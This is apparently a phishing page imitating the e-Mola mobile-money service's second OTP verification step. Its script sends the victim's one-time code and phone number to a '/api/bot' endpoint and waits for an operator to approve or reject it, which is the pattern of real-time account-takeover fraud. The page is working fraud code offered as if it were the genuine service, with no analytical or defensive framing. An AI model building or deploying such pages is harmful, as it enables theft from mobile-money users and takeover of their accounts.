<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>e-Mola - OTP 2</title>
    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
        body { margin: 0; background-color: #E67E22; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card { background: white; border-radius: 30px; padding: 30px 20px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        .logo { font-family: 'Caveat', cursive; font-size: 42px; color: #E67E22; margin: 0; line-height: 1; }
        .tagline { font-size: 12px; color: #777; margin-bottom: 20px; }
        .title { font-family: 'Caveat', cursive; font-size: 28px; color: #333; margin-bottom: 10px; }
        .subtitle { font-size: 14px; color: #555; margin-bottom: 20px; font-family: 'Caveat', cursive; line-height: 1.4;}
        
        .otp-input { width: 100%; padding: 20px; font-size: 24px; letter-spacing: 10px; text-align: center; border: 1px solid #E67E22; border-radius: 12px; outline: none; background: #fff; margin-bottom: 20px; color: #555; }
        .otp-input::placeholder { color: #ccc; }
        
        .btn-main { width: 100%; background: #E67E22; color: white; font-size: 18px; font-weight: bold; padding: 18px; border: none; border-radius: 12px; cursor: pointer; font-family: 'Caveat', cursive; letter-spacing: 1px; }
        .btn-main:disabled { background: #ccc; }

        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E67E22; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: red; font-weight: bold; display: none; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="spinner"></div>
        <h2>A Verificar...</h2>
    </div>

    <div class="card">
        <h1 class="logo">e-Mola</h1>
        <div class="tagline">Meu cell, minha mola</div>
        
        <div class="title">Verificação OTP (2/2)</div>
        <div class="subtitle">Insira o segundo código OTP de 6 dígitos de confirmação.</div>

        <div class="error-msg" id="errorMsg">Código incorreto. Tente novamente.</div>

        <input type="text" id="otpInput" class="otp-input" maxlength="6" placeholder="000000" inputmode="numeric" pattern="\d*">

        <button id="submitBtn" class="btn-main" disabled onclick="submitOtp()">CONFIRMAR OTP FINAL</button>
    </div>

    <script>
        let globalUserId = sessionStorage.getItem('globalUserId');
        let userPhone = sessionStorage.getItem('userPhone');

        let otpField = document.getElementById('otpInput');
        let btn = document.getElementById('submitBtn');

        otpField.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            btn.disabled = this.value.length !== 6;
            document.getElementById('errorMsg').style.display = 'none';
        });

        function submitOtp() {
            let otp = otpField.value;
            if(otp.length !== 6) return;

            document.getElementById('overlay').style.display = 'flex';

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'OTP2', userId: globalUserId, 
                    data: { phone: userPhone, value: otp } 
                })
            }).then(function() { pollStatus(); })
            .catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Erro de rede.");
            });
        }

        function pollStatus() {
            let interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=OTP2', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'success.html'; 
                    } else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('errorMsg').style.display = 'block';
                        otpField.value = ''; 
                        btn.disabled = true;
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
